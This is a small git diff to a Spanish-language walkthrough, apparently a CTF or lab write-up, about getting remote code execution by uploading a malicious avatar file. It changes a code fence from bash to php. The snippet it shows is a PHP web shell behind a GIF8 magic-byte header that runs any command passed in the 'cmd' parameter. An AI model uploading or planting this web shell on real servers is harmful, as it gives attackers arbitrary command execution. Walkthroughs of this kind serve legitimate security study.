@@ -61,9 +61,8 @@ Encontrándome así que esta versión es vulnerable a un **RCE** mediante la sub
 En éste caso, estaré haciéndolo manual ya qué conozco como el script funciona & hace esta subida de archivo malicioso...
 
 1. Creamos el archivo malicioso con extensión **.php** que subiremos como "avatar":
-```bash
+```php
 GIF8;
-
 <?php system($_GET['cmd']); ?>
 ```
 
